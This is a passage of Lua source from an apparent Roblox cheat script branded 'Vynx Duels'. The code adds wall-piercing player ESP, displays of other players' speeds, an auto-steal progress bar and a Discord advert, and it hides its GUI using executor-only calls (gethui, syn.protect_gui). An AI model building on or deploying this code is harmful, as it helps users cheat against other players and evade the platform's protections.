    label.TextColor3 = CHERRY_ACCENT or Color3.fromRGB(255,255,255)
    label.Font = Enum.Font.GothamBold
    label.TextScaled = true
    label.TextStrokeTransparency = 0
    M.addShimmerToLabel(label, CHERRY_ACCENT or Color3.fromRGB(255,255,255), Color3.fromRGB(255,255,255))
    local conn
    conn = char.AncestryChanged:Connect(function(_, parent)
        if not parent then
            M.removePlayerSpeedGui(plr)
            if conn then conn:Disconnect() end
        end
    end)
    M.playerSpeedGuis[plr] = {gui = bb, label = label, conn = conn}
end

function M.removePlayerSpeedGui(plr)
    local data = M.playerSpeedGuis[plr]
    if data then
        if data.conn then data.conn:Disconnect() end
        if data.gui then data.gui:Destroy() end
        M.playerSpeedGuis[plr] = nil
    end
end

function M.updatePlayerSpeed(plr)
    if not M.showPlayerSpeeds then return end
    local data = M.playerSpeedGuis[plr]
    if not data then return end
    local char = plr.Character
    if not char then M.removePlayerSpeedGui(plr); return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local speed = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z).Magnitude
    data.label.Text = string.format("%.1f", speed)
end

function M.updateAllPlayerSpeeds()
    for plr, _ in pairs(M.playerSpeedGuis) do M.updatePlayerSpeed(plr) end
end

function M.startPlayerSpeedUpdates()
    if M.playerSpeedUpdateConn then return end
    local _acc = 0
    M.playerSpeedUpdateConn = RunService.Heartbeat:Connect(function(dt)
        _acc = _acc + (dt or 0.016)
        if _acc < 0.15 then return end
        _acc = 0
        M.updateAllPlayerSpeeds()
    end)
end

function M.stopPlayerSpeedUpdates()
    if M.playerSpeedUpdateConn then M.playerSpeedUpdateConn:Disconnect(); M.playerSpeedUpdateConn = nil end
end

function M.togglePlayerSpeeds(on)
    M.showPlayerSpeeds = on
    if on then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player then M.createPlayerSpeedGui(plr) end
        end
        M.startPlayerSpeedUpdates()
    else
        for plr, _ in pairs(M.playerSpeedGuis) do M.removePlayerSpeedGui(plr) end
        M.stopPlayerSpeedUpdates()
    end
end




function M.addESP(plr)
    if plr == player then return end
    if M.espList[plr] then return end
    local char = plr.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end
    local nameBB = Instance.new("BillboardGui")
    nameBB.Size = UDim2.new(0, 120, 0, 30)
    nameBB.StudsOffset = Vector3.new(0, 2.8, 0)
    nameBB.AlwaysOnTop = true
    nameBB.Adornee = head
    nameBB.Parent = head
    local nameLbl = Instance.new("TextLabel", nameBB)
    nameLbl.Size = UDim2.new(1,0,1,0)
    nameLbl.BackgroundTransparency = 1
    nameLbl.Text = plr.Name
    nameLbl.TextColor3 = Color3.fromRGB(255,255,255)
    nameLbl.Font = Enum.Font.GothamBold
    nameLbl.TextScaled = true
    nameLbl.TextStrokeTransparency = 0
    nameLbl.TextStrokeColor3 = Color3.fromRGB(0,0,0)

    local highlight = Instance.new("Highlight")
    highlight.Adornee = char
    highlight.FillTransparency = 1
    highlight.OutlineTransparency = 0.3
    highlight.OutlineColor = Color3.fromRGB(255,255,255)
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Parent = char

    M.espList[plr] = {nameBB = nameBB, highlight = highlight}
end

function M.removeESP(plr)
    local data = M.espList[plr]
    if data then
        if data.nameBB then data.nameBB:Destroy() end
        if data.highlight then data.highlight:Destroy() end
        M.espList[plr] = nil
    end
end

function M.clearESP()
    for plr, _ in pairs(M.espList) do M.removeESP(plr) end
end

function M.toggleESP(on)
    M.playerESPEnabled = on
    if on then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player then M.addESP(plr) end
        end
        if not M._espPlayerAdded then
            M._espPlayerAdded = Players.PlayerAdded:Connect(function(p)
                if p ~= player and M.playerESPEnabled then
                    p.CharacterAdded:Connect(function()
                        task.wait(0.5)
                        M.addESP(p)
                    end)
                    if p.Character then task.wait(0.5); M.addESP(p) end
                end
            end)
            M.trackConn(M._espPlayerAdded)
        end
        if not M._espPlayerRemoved then
            M._espPlayerRemoved = Players.PlayerRemoving:Connect(function(p)
                M.removeESP(p)
            end)
            M.trackConn(M._espPlayerRemoved)
        end
    else
        M.clearESP()
        if M._espPlayerAdded then M._espPlayerAdded:Disconnect(); M._espPlayerAdded = nil end
        if M._espPlayerRemoved then M._espPlayerRemoved:Disconnect(); M._espPlayerRemoved = nil end
    end
end






M.avatarESPEnabled = true
M.avatarESPList = {}
M.AVATAR_ESP_SIZE = 56
M.AVATAR_ESP_OFFSET = Vector3.new(0, 3.4, 0)

function M.getPlayerAvatarThumb(userId)
    local ok, content = pcall(function()
        return Players:GetUserThumbnailAsync(
            userId,
            Enum.ThumbnailType.HeadShot,
            Enum.ThumbnailSize.Size100x100
        )
    end)
    if ok and content then return content end
    return "rbxasset://textures/ui/GuiImagePlaceholder.png"
end

function M.addAvatarESP(plr)
    if not plr or plr == player then return end
    if M.avatarESPList[plr] then
        
        local data = M.avatarESPList[plr]
        local char = plr.Character
        local head = char and char:FindFirstChild("Head")
        if data.bb and head and data.bb.Adornee ~= head then
            data.bb.Adornee = head
            data.bb.Parent = head
        end
        return
    end
    local char = plr.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    local old = head:FindFirstChild("VynxAvatarCircleESP")
    if old then pcall(function() old:Destroy() end) end

    local size = tonumber(M.AVATAR_ESP_SIZE) or 56
    local bb = Instance.new("BillboardGui")
    bb.Name = "VynxAvatarCircleESP"
    bb.Size = UDim2.fromOffset(size, size)
    bb.StudsOffset = M.AVATAR_ESP_OFFSET or Vector3.new(0, 3.4, 0)
    bb.AlwaysOnTop = true
    bb.MaxDistance = 250
    bb.Adornee = head
    bb.Parent = head

    local ring = Instance.new("Frame")
    ring.Name = "Ring"
    ring.Size = UDim2.fromScale(1, 1)
    ring.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    ring.BackgroundTransparency = 0.15
    ring.BorderSizePixel = 0
    ring.Parent = bb
    Instance.new("UICorner", ring).CornerRadius = UDim.new(1, 0)
    local stroke = Instance.new("UIStroke")
    stroke.Color = (M.Theme and M.Theme.Accent) or M.UI_ACCENT or Color3.fromRGB(180, 80, 255)
    stroke.Thickness = 2.2
    stroke.Transparency = 0.15
    stroke.Parent = ring

    local avatar = Instance.new("ImageLabel")
    avatar.Name = "Avatar"
    avatar.AnchorPoint = Vector2.new(0.5, 0.5)
    avatar.Position = UDim2.fromScale(0.5, 0.5)
    avatar.Size = UDim2.fromScale(0.82, 0.82)
    avatar.BackgroundTransparency = 1
    avatar.BorderSizePixel = 0
    avatar.ScaleType = Enum.ScaleType.Crop
    avatar.Image = M.getPlayerAvatarThumb(plr.UserId)
    avatar.Parent = ring
    Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)

    local nameTag = Instance.new("TextLabel")
    nameTag.Name = "NameTag"
    nameTag.AnchorPoint = Vector2.new(0.5, 0)
    nameTag.Position = UDim2.new(0.5, 0, 1, 2)
    nameTag.Size = UDim2.new(0, 90, 0, 14)
    nameTag.BackgroundTransparency = 1
    nameTag.Text = plr.DisplayName or plr.Name
    nameTag.TextColor3 = Color3.fromRGB(255, 255, 255)
    nameTag.TextStrokeTransparency = 0.4
    nameTag.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    nameTag.Font = Enum.Font.GothamBold
    nameTag.TextSize = 11
    nameTag.TextScaled = false
    nameTag.Parent = bb

    local charConn
    charConn = plr.CharacterAdded:Connect(function(newChar)
        task.wait(0.35)
        if not M.avatarESPEnabled then return end
        M.removeAvatarESP(plr)
        M.addAvatarESP(plr)
    end)

    M.avatarESPList[plr] = {bb = bb, ring = ring, avatar = avatar, stroke = stroke, conn = charConn}
end

function M.removeAvatarESP(plr)
    local data = M.avatarESPList and M.avatarESPList[plr]
    if not data then return end
    if data.conn then pcall(function() data.conn:Disconnect() end) end
    if data.bb then pcall(function() data.bb:Destroy() end) end
    M.avatarESPList[plr] = nil
end

function M.clearAvatarESP()
    for plr, _ in pairs(M.avatarESPList or {}) do
        M.removeAvatarESP(plr)
    end
end

function M.refreshAllAvatarESP()
    if not M.avatarESPEnabled then
        M.clearAvatarESP()
        return
    end
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then
            pcall(function() M.addAvatarESP(plr) end)
        end
    end
end

function M.toggleAvatarESP(on)
    M.avatarESPEnabled = on and true or false
    if M.avatarESPEnabled then
        M.refreshAllAvatarESP()
        if not M._avatarESPPlayerAdded then
            M._avatarESPPlayerAdded = Players.PlayerAdded:Connect(function(p)
                if p == player or not M.avatarESPEnabled then return end
                p.CharacterAdded:Connect(function()
                    task.wait(0.4)
                    if M.avatarESPEnabled then M.addAvatarESP(p) end
                end)
                if p.Character then
                    task.defer(function()
                        task.wait(0.3)
                        if M.avatarESPEnabled then M.addAvatarESP(p) end
                    end)
                end
            end)
            M.trackConn(M._avatarESPPlayerAdded)
        end
        if not M._avatarESPPlayerRemoving then
            M._avatarESPPlayerRemoving = Players.PlayerRemoving:Connect(function(p)
                M.removeAvatarESP(p)
            end)
            M.trackConn(M._avatarESPPlayerRemoving)
        end
    else
        M.clearAvatarESP()
    end
end





M.vynxDetectEnabled = false
M.vynxDetectList = {}
function M.tagLocalAsVynx(...) end
function M.isPlayerUsingVynx(...) return false end
function M.removeVynxDetect(...) end
function M.clearVynxDetect() end
function M.addVynxDetect(...) end
function M.refreshVynxDetectLabels() end
function M.toggleVynxDetect(on)
    M.vynxDetectEnabled = false
    M.clearVynxDetect()
end





M.headIndicator = nil

function M.setupHeadIndicator(char)
    local head=char:WaitForChild("Head",5);if not head then return end
    if head:FindFirstChild("MoveeHeadIndicator") then head.MoveeHeadIndicator:Destroy() end
    local bb=Instance.new("BillboardGui",head)
    bb.Name="MoveeHeadIndicator"
    bb.Size=UDim2.new(0,280,0,88)
    bb.StudsOffset=Vector3.new(0,3.5,0)
    bb.AlwaysOnTop=true
    bb.Parent=head

    local accent = (M.Theme and M.Theme.Accent) or CHERRY_ACCENT or Color3.fromRGB(255,255,255)
    local WHITE = Color3.fromRGB(255, 255, 255)
    local STROKE = Color3.fromRGB(0, 0, 0)

    local function styleThick(lbl, col)
        lbl.TextColor3 = col
        lbl.Font = Enum.Font.GothamBlack
        lbl.TextScaled = true
        lbl.TextStrokeTransparency = 0
        lbl.TextStrokeColor3 = STROKE
        
        local ts = Instance.new("UITextSizeConstraint")
        ts.MinTextSize = 12
        ts.MaxTextSize = 28
        ts.Parent = lbl
    end

    local ragdollLbl=Instance.new("TextLabel",bb)
    ragdollLbl.Name="RagdollTimer"
    ragdollLbl.Size=UDim2.new(1,0,0.32,0)
    ragdollLbl.Position=UDim2.new(0,0,0,0)
    ragdollLbl.BackgroundTransparency=1
    ragdollLbl.Text=""
    styleThick(ragdollLbl, accent)

    local discordLbl=Instance.new("TextLabel",bb)
    discordLbl.Name="Discord"
    discordLbl.Size=UDim2.new(1,0,0.34,0)
    discordLbl.Position=UDim2.new(0,0,0.30,0)
    discordLbl.BackgroundTransparency=1
    discordLbl.Text="discord.gg/vynxduels"
    styleThick(discordLbl, accent)

    

    local speedLbl=Instance.new("TextLabel",bb)
    speedLbl.Name="Speed"
    speedLbl.Size=UDim2.new(0.38,0,0.34,0)
    speedLbl.Position=UDim2.new(0.02,0,0.64,0)
    speedLbl.BackgroundTransparency=1
    speedLbl.Text="0.0"
    speedLbl.TextXAlignment=Enum.TextXAlignment.Right
    styleThick(speedLbl, WHITE)

    local modeLbl=Instance.new("TextLabel",bb)
    modeLbl.Name="Mode"
    modeLbl.Size=UDim2.new(0.56,0,0.34,0)
    modeLbl.Position=UDim2.new(0.42,0,0.64,0)
    modeLbl.BackgroundTransparency=1
    modeLbl.Text="NORMAL MODE"
    modeLbl.TextXAlignment=Enum.TextXAlignment.Left
    styleThick(modeLbl, WHITE)

    M.headIndicator = {bb=bb, discord=discordLbl, speed=speedLbl, mode=modeLbl, ragdollTimer=ragdollLbl, divider=nil}
    M.updateHeadTheme()
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
end

function M.updateHeadTheme()
    if not M.headIndicator then return end
    
    local name = (M.Theme and M.Theme.Name) or (CherryConfig and CherryConfig.Theme) or M.colorScheme or M._savedTheme or "White"
    local accent = (M.Theme and M.Theme.Accent) or M.UI_ACCENT or UI_ACCENT or Color3.fromRGB(255,255,255)
    if name == "White" or name == "Default" then
        accent = Color3.fromRGB(255, 255, 255)
    elseif CHERRY_THEMES and CHERRY_THEMES[name] and CHERRY_THEMES[name].Accent then
        accent = CHERRY_THEMES[name].Accent
    end
    local STROKE = Color3.fromRGB(0, 0, 0)
    local function paint(lbl, col)
        if not lbl then return end
        lbl.TextColor3 = col
        lbl.Font = Enum.Font.GothamBlack
        lbl.TextStrokeTransparency = 0
        lbl.TextStrokeColor3 = STROKE
    end
    paint(M.headIndicator.discord, accent)
    paint(M.headIndicator.ragdollTimer, accent)
    paint(M.headIndicator.speed, Color3.fromRGB(255, 255, 255))
    paint(M.headIndicator.mode, Color3.fromRGB(255, 255, 255))
    if M.headIndicator.divider then
        pcall(function() M.headIndicator.divider:Destroy() end)
        M.headIndicator.divider = nil
    end
end

local speedUpdateConn = nil
function M.startHeadSpeedUpdates()
    if speedUpdateConn then return end
    local _acc = 0
    speedUpdateConn = RunService.Heartbeat:Connect(function(dt)
        _acc = _acc + dt
        if _acc < 0.12 then return end
        _acc = 0
        if not (M.headIndicator and M.headIndicator.speed) then return end
        local displaySpeed
        if M.autoLeftEnabled or M.autoRightEnabled then
            displaySpeed = M.NS
        else
            displaySpeed = M.getActiveMoveSpeed()
        end
        M.headIndicator.speed.Text = string.format("%.1f", displaySpeed)
        if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
    end)
end

function M.stopHeadSpeedUpdates()
    if speedUpdateConn then
        speedUpdateConn:Disconnect()
        speedUpdateConn = nil
    end
end




function M.buildStatusUI()
    if M.statusGui then
        pcall(function() M.statusGui:Destroy() end)
        M.statusGui = nil
    end

    local accent = (M.Theme and M.Theme.Accent) or M.UI_ACCENT or UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(165, 75, 255)
    local barW = math.clamp(tonumber(M.stealBarSize) or 520, 380, 1000)

    local gui = Instance.new("ScreenGui")
    gui.Name = "StealProgressWindow"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 50

    do
        local ok = false
        if gethui then
            ok = pcall(function() gui.Parent = gethui() end)
        elseif syn and syn.protect_gui then
            ok = pcall(function()
                syn.protect_gui(gui)
                gui.Parent = game:GetService("CoreGui")
            end)
        end
        if not ok then
            gui.Parent = player:WaitForChild("PlayerGui")
        end
    end

    for _, v in ipairs(gui.Parent:GetChildren()) do
        if v ~= gui and v:IsA("ScreenGui") and (
            v.Name == gui.Name or v.Name == "VynxStatusUI" or v.Name == "K7_StatusUI"
            or v.Name == "VynxDuelsV21" or v.Name == "StealProgressWindow"
        ) then
            pcall(function() v:Destroy() end)
        end
    end

    local holder = Instance.new("Frame")
    holder.Name = "StealBarHolder"
    holder.Size = UDim2.new(0, barW, 0, 92)
    holder.Position = UDim2.new(0.5, -math.floor(barW / 2), 1, -110)
    holder.BackgroundTransparency = 1
    holder.Active = true
    holder.Parent = gui

    local main = Instance.new("Frame")
    main.Name = "StealBar"
    main.Size = UDim2.new(1, 0, 1, 0)
    main.Position = UDim2.new(0, 0, 0, 0)
    main.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
    main.BackgroundTransparency = 0.08
    main.BorderSizePixel = 0
    main.Active = true
    main.ClipsDescendants = true
    main.Parent = holder
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)

    local bgGrad = Instance.new("UIGradient")
    bgGrad.Rotation = 90
    bgGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 22, 29)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(11, 11, 15)),
    })
    bgGrad.Parent = main

    local mainStroke = Instance.new("UIStroke")
    mainStroke.Name = "MainStroke"
    mainStroke.Color = accent
    mainStroke.Thickness = 1
    mainStroke.Transparency = 0.6
    mainStroke.Parent = main

    
    do
        local id = tonumber(M.customBgId) or tonumber(M.DEFAULT_BG_ID)
        if id and id > 0 then
            local bg = Instance.new("ImageLabel")
            bg.Name = "CustomBgImage"
            bg.Size = UDim2.new(1, 0, 1, 0)
            bg.BackgroundTransparency = 1
            bg.Image = "rbxassetid://" .. tostring(id)
            bg.ScaleType = Enum.ScaleType.Crop
            bg.ImageTransparency = tonumber(M.customBgOpacity) or 0.5
            bg.ZIndex = 0
            bg.Parent = main
            Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 16)
        end
    end

    
    local topGlow = Instance.new("Frame")
    topGlow.Name = "TopGlow"
    topGlow.Size = UDim2.new(1, -40, 0, 1)
    topGlow.Position = UDim2.new(0, 20, 0, 0)
    topGlow.BackgroundColor3 = accent
    topGlow.BackgroundTransparency = 0.55
    topGlow.BorderSizePixel = 0
    topGlow.ZIndex = 7
    topGlow.Parent = main
    local topGlowGrad = Instance.new("UIGradient")
    topGlowGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 1),
        NumberSequenceKeypoint.new(0.5, 0.45),
        NumberSequenceKeypoint.new(1, 1),
    })
    topGlowGrad.Parent = topGlow

    
    local dotRing = Instance.new("Frame")
    dotRing.Size = UDim2.fromOffset(30, 30)
    dotRing.Position = UDim2.fromOffset(14, 18)
    dotRing.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
    dotRing.BorderSizePixel = 0
    dotRing.ZIndex = 6
    dotRing.Parent = main
    Instance.new("UICorner", dotRing).CornerRadius = UDim.new(1, 0)
    local ringStroke = Instance.new("UIStroke")
    ringStroke.Color = Color3.fromRGB(160, 160, 175)
    ringStroke.Thickness = 1
    ringStroke.Transparency = 0.5
    ringStroke.Parent = dotRing
    local dot = Instance.new("Frame")
    dot.Name = "StatusDot"
    dot.Size = UDim2.fromOffset(10, 10)
    dot.AnchorPoint = Vector2.new(0.5, 0.5)
    dot.Position = UDim2.fromScale(0.5, 0.5)
    dot.BackgroundColor3 = Color3.fromRGB(150, 150, 162)
    dot.BorderSizePixel = 0
    dot.ZIndex = 7
    dot.Parent = dotRing
    Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
    local dotScale = Instance.new("UIScale")
    dotScale.Parent = dot
    local dotThread = nil
    local function startDotPulse()
        if dotThread then return end
        dotThread = task.spawn(function()
            while dotThread ~= nil and main.Parent do
                pcall(function()
                    local up = TweenService:Create(dotScale, TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Scale = 1.22})
                    up:Play()
                    up.Completed:Wait()
                    local dn = TweenService:Create(dotScale, TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Scale = 1})
                    dn:Play()
                    dn.Completed:Wait()
                end)
            end
            if not main.Parent then dotThread = nil end
        end)
    end
    startDotPulse()

    
    local pctLbl = Instance.new("TextLabel")
    pctLbl.Name = "PctLabel"
    pctLbl.BackgroundTransparency = 1
    pctLbl.Position = UDim2.fromOffset(54, 20)
    pctLbl.Size = UDim2.fromOffset(140, 30)
    pctLbl.Font = Enum.Font.GothamBlack
    pctLbl.TextSize = 26
    pctLbl.TextColor3 = Color3.fromRGB(235, 235, 240)
    pctLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    pctLbl.TextStrokeTransparency = 0.35
    pctLbl.TextXAlignment = Enum.TextXAlignment.Left
    pctLbl.Text = "0%"
    pctLbl.ZIndex = 8
    pctLbl.Parent = main
    M.statusBarPctLbl = pctLbl

    
    local statusLbl = Instance.new("TextLabel")
    statusLbl.Name = "StatusSub"
    statusLbl.BackgroundTransparency = 1
    statusLbl.Position = UDim2.fromOffset(54, 48)
    statusLbl.Size = UDim2.fromOffset(160, 14)
    statusLbl.Font = Enum.Font.GothamMedium
    statusLbl.TextSize = 11
    statusLbl.TextColor3 = Color3.fromRGB(150, 150, 162)
    statusLbl.TextXAlignment = Enum.TextXAlignment.Left
    statusLbl.Text = "IDLE"
    statusLbl.ZIndex = 8
    statusLbl.Parent = main
    M.statusSubLbl = statusLbl

    
    local brandPill = Instance.new("Frame")
    brandPill.Name = "BrandPill"
    brandPill.Size = UDim2.fromOffset(88, 18)
    brandPill.AnchorPoint = Vector2.new(1, 0)
    brandPill.Position = UDim2.new(1, -14, 0, 8)
    brandPill.BackgroundColor3 = Color3.fromRGB(6, 6, 10)
    brandPill.BackgroundTransparency = 0.5
    brandPill.BorderSizePixel = 0
    brandPill.ZIndex = 7
    brandPill.Parent = main
    Instance.new("UICorner", brandPill).CornerRadius = UDim.new(1, 0)
    local brandLbl = Instance.new("TextLabel")
    brandLbl.Name = "BrandLabel"
    brandLbl.BackgroundTransparency = 1
    brandLbl.Size = UDim2.new(1, 0, 1, 0)
    brandLbl.Font = Enum.Font.GothamMedium
    brandLbl.TextSize = 8.5
    brandLbl.TextColor3 = Color3.fromRGB(150, 150, 162)
    brandLbl.TextXAlignment = Enum.TextXAlignment.Center
    brandLbl.Text = "VYNX DUELS"
    brandLbl.ZIndex = 8
    brandLbl.Parent = brandPill

    
    local modeLbl = Instance.new("TextLabel")
    modeLbl.Name = "ModeLabel"
    modeLbl.BackgroundTransparency = 1
    modeLbl.AnchorPoint = Vector2.new(1, 0)
    modeLbl.Position = UDim2.new(1, -14, 0, 32)
    modeLbl.Size = UDim2.fromOffset(120, 12)
    modeLbl.Font = Enum.Font.GothamMedium
    modeLbl.TextSize = 10
    modeLbl.TextColor3 = Color3.fromRGB(105, 105, 118)
    modeLbl.TextXAlignment = Enum.TextXAlignment.Right
    local modeText = tostring(M.stealMode or "Normal")
    if modeText == "V1" then modeText = "Normal" end
    modeLbl.Text = string.upper(modeText)
    modeLbl.ZIndex = 8
    modeLbl.Parent = main
    M.statusModeLbl = modeLbl

    
    local infoLbl = Instance.new("TextLabel")
    infoLbl.Name = "InfoLabel"
    infoLbl.BackgroundTransparency = 1
    infoLbl.AnchorPoint = Vector2.new(1, 0)
    infoLbl.Position = UDim2.new(1, -14, 0, 50)
    infoLbl.Size = UDim2.fromOffset(160, 12)
    infoLbl.Font = Enum.Font.GothamMedium
    infoLbl.TextSize = 10
    infoLbl.TextColor3 = Color3.fromRGB(105, 105, 118)
    infoLbl.TextXAlignment = Enum.TextXAlignment.Right
    infoLbl.Text = "FPS 0 · PING 0ms"
    infoLbl.ZIndex = 8
    infoLbl.Parent = main
    M.statusFpsLbl = infoLbl
    M.statusPingLbl = infoLbl

    
    local radiusLabel = Instance.new("TextLabel")
    radiusLabel.Visible = false
    radiusLabel.Text = "Radius: 62"
    radiusLabel.Parent = main
    M.statusRadiusLbl = radiusLabel

    
    local track = Instance.new("Frame")
    track.Name = "Track"
    track.Position = UDim2.new(0, 18, 1, -22)
    track.Size = UDim2.new(1, -36, 0, 14)
    track.BackgroundColor3 = Color3.fromRGB(4, 4, 7)
    track.BackgroundTransparency = 0.35
    track.BorderSizePixel = 0
    track.ClipsDescendants = true
    track.ZIndex = 7
    track.Parent = main
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
    local trackStroke = Instance.new("UIStroke")
    trackStroke.Color = Color3.fromRGB(255, 255, 255)
    trackStroke.Thickness = 0.8
    trackStroke.Transparency = 0.85
    trackStroke.Parent = track

    
    local fillGlow = Instance.new("Frame")
    fillGlow.Name = "FillGlow"
    fillGlow.Size = UDim2.fromScale(0, 1)
    fillGlow.BackgroundColor3 = accent
    fillGlow.BackgroundTransparency = 0.8
    fillGlow.BorderSizePixel = 0
    fillGlow.ZIndex = 6
    fillGlow.Parent = track
    Instance.new("UICorner", fillGlow).CornerRadius = UDim.new(1, 0)

    
    local progressFill = Instance.new("Frame")
    progressFill.Name = "Fill"
    progressFill.Size = UDim2.fromScale(0, 1)
    progressFill.BackgroundColor3 = accent
    progressFill.BorderSizePixel = 0
    progressFill.ClipsDescendants = true
    progressFill.ZIndex = 7
    progressFill.Parent = track
    Instance.new("UICorner", progressFill).CornerRadius = UDim.new(1, 0)
    local fillGrad = Instance.new("UIGradient")
    fillGrad.Rotation = 0
    fillGrad.Parent = progressFill
    M.statusFill = progressFill

    
    local knob = Instance.new("Frame")
    knob.Name = "Knob"
    knob.Size = UDim2.fromOffset(16, 16)
    knob.AnchorPoint = Vector2.new(1, 0.5)
    knob.Position = UDim2.fromScale(1, 0.5)
    knob.BackgroundColor3 = Color3.fromRGB(160, 160, 175)
    knob.BorderSizePixel = 0
    knob.ZIndex = 8
    knob.Parent = progressFill
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

    
    local sheen = Instance.new("Frame")
    sheen.Name = "Sheen"
    sheen.Size = UDim2.fromOffset(40, 8)
    sheen.Position = UDim2.fromScale(-0.4, 0)
    sheen.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    sheen.BackgroundTransparency = 0.6
    sheen.BorderSizePixel = 0
    sheen.ZIndex = 8
    sheen.Parent = progressFill
    local sheenGrad = Instance.new("UIGradient")
    sheenGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 1),
        NumberSequenceKeypoint.new(0.5, 0.7),
        NumberSequenceKeypoint.new(1, 1),
    })
    sheenGrad.Parent = sheen
    local shimmerThread = nil
    local function startShimmer()
        if shimmerThread then return end
        shimmerThread = task.spawn(function()
            while shimmerThread ~= nil and main.Parent and sheen.Parent do
                pcall(function()
                    local fw = TweenService:Create(sheen, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.fromScale(1.4, 0)})
                    fw:Play()
                    fw.Completed:Wait()
                end)
                if shimmerThread == nil or not main.Parent or not sheen.Parent then break end
                pcall(function()
                    local bk = TweenService:Create(sheen, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.fromScale(-0.4, 0)})
                    bk:Play()
                    bk.Completed:Wait()
                end)
            end
            if not main.Parent or not sheen.Parent then shimmerThread = nil end
        end)
    end
    local function stopShimmer()
        if shimmerThread then
            task.cancel(shimmerThread)
            shimmerThread = nil
        end
    end
    startShimmer()

    do
        local frameCount, timeAccum = 0, 0
        local fpsConn
        fpsConn = RunService.RenderStepped:Connect(function(delta)
            if not gui.Parent then
                if fpsConn then fpsConn:Disconnect() end
                return
            end
            frameCount = frameCount + 1
            timeAccum = timeAccum + delta
            if timeAccum >= 0.5 then
                local fps = math.floor(frameCount / timeAccum + 0.5)
                frameCount, timeAccum = 0, 0
                local ping = 0
                pcall(function()
                    ping = math.floor(player:GetNetworkPing() * 1000 + 0.5)
                end)
                if infoLbl and infoLbl.Parent then
                    infoLbl.Text = ("FPS %d · PING %dms"):format(fps, ping)
                end
            end
        end)
    end

    
    do
        local dragging, dragStart, startPos
        local function beginDrag(input)
            if M.uiLocked then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = holder.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end)
            end
        end
        holder.InputBegan:Connect(beginDrag)
        main.InputBegan:Connect(beginDrag)
        UIS.InputChanged:Connect(function(input)
            if M.uiLocked then dragging = false return end
            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                local d = input.Position - dragStart
                holder.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end

    M.statusGui = gui
    M.statusMain = main
    M.statusDot = dot
    M.statusHolder = holder
    M.statusPctLbl = pctLbl

    M.updateRadiusMarker = function()
        if M.statusRadiusLbl then
            local r = 62
            pcall(function()
                r = (M.getActiveStealRadius and M.getActiveStealRadius()) or (M.Steal and M.Steal.StealRadius) or 62
            end)
            M.statusRadiusLbl.Text = string.format("Radius: %.2g", r)
        end
        if M.statusModeLbl then
            local mt = tostring(M.stealMode or "Normal")
            if mt == "V1" then mt = "Normal" end
            M.statusModeLbl.Text = string.upper(mt)
        end
    end
    M.updateRadiusMarker()

    if M.applyStealBarTheme then
        pcall(function() M.applyStealBarTheme(accent) end)
    end
end

function M.updateStealProgress(progress, label)
    progress = math.clamp(progress or 0, 0, 1)
    local pct = math.floor(progress * 100 + 0.5)
    local accent = (M.Theme and M.Theme.Accent) or M.UI_ACCENT or UI_ACCENT or Color3.fromRGB(165, 75, 255)
    if M.statusFill then
        M.statusFill.Size = UDim2.new(progress, 0, 1, 0)
        M.statusFill.BackgroundColor3 = accent
        local g = M.statusFill:FindFirstChildOfClass("UIGradient")
        if g then
            g.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, accent),
                ColorSequenceKeypoint.new(1, accent:Lerp(Color3.fromRGB(255, 255, 255), 0.35)),
            })
        end
    end
    if M.statusBarPctLbl then
        M.statusBarPctLbl.Text = pct .. "%"
    end
    if M.statusSubLbl then
        if type(label) == "string" and label ~= "" then
            M.statusSubLbl.Text = string.upper(label)
        elseif progress > 0 then
            M.statusSubLbl.Text = "HOLDING"
        else
            local ready = M.Steal and M.Steal.AutoStealEnabled
            M.statusSubLbl.Text = ready and "READY" or "OFF"
        end
    elseif M.statusPctLbl then
        if type(label) == "string" and label ~= "" then
            M.statusPctLbl.Text = string.upper(label)
        elseif progress > 0 then
            M.statusPctLbl.Text = "HOLDING " .. pct .. "%"
        else
            local ready = M.Steal and M.Steal.AutoStealEnabled
            M.statusPctLbl.Text = ready and "READY" or "OFF"
        end
    end
